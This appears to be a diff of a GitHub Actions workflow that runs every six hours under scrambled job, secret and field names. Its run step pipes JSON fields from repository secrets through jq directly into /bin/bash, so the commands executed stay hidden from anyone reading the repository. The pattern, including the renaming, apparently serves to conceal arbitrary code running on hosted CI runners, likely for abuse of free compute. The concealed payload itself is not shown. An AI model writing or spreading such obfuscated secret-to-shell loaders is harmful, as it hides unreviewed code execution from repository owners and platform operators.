@@ -3,7 +3,7 @@ name: zengwutuan1234
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 0/6 * * *'
+    - cron: '29 5/6 * * *'
 
 jobs:
   build:
@@ -12,20 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: zengwutuan1234
         env:
-          r192: ${{ secrets.r192 }}
+          kna04: ${{ secrets.kna04 }}
         run: |
-          echo $r192 | jq -r .gr21211 | /bin/bash
-          echo $poq14 | jq -r .hq01 | /bin/bash
-          echo $mrrx61 | jq -r .ufbz91799 | /bin/bash
-          echo $b26 | jq -r .tyz58285 | /bin/bash
-          echo $ylhk29 | jq -r .hcb1461 | /bin/bash
-          echo $naa64701 | jq -r .nyeum23 | /bin/bash
-          echo $gvoz29016 | jq -r .hkwqt9 | /bin/bash
-          echo $rwob1 | jq -r .yhe19921 | /bin/bash
-          echo $zayc34622 | jq -r .af217 | /bin/bash
-          echo $hzly931 | jq -r .ajil86114 | /bin/bash
-          echo $gyoul726 | jq -r .lyarw2293 | /bin/bash
-          echo $xn7404 | jq -r .kbspa89777 | /bin/bash
-          echo $gqpg3319 | jq -r .qx917 | /bin/bash
-          echo $eot7230 | jq -r .adjg957 | /bin/bash
+          echo $kna04 | jq -r .cs998 | /bin/bash
+          echo $iqjs1 | jq -r .qbbk3994 | /bin/bash
+          echo $l3 | jq -r .ylwvb534 | /bin/bash
+          echo $rmrsw26 | jq -r .mm7 | /bin/bash
+          echo $etnsa016 | jq -r .vhb02745 | /bin/bash
+          echo $ycei38260 | jq -r .ojf12 | /bin/bash
+          echo $fxx34 | jq -r .twoot49192 | /bin/bash
+          echo $mbst22 | jq -r .anslu89 | /bin/bash
+          echo $y2764 | jq -r .od628 | /bin/bash
+          echo $ffryu1139 | jq -r .x5445 | /bin/bash
+          echo $ndric6 | jq -r .smwh2 | /bin/bash
+          echo $jivgw031 | jq -r .cvjcy8 | /bin/bash
+          echo $ih50602 | jq -r .lu0 | /bin/bash
 
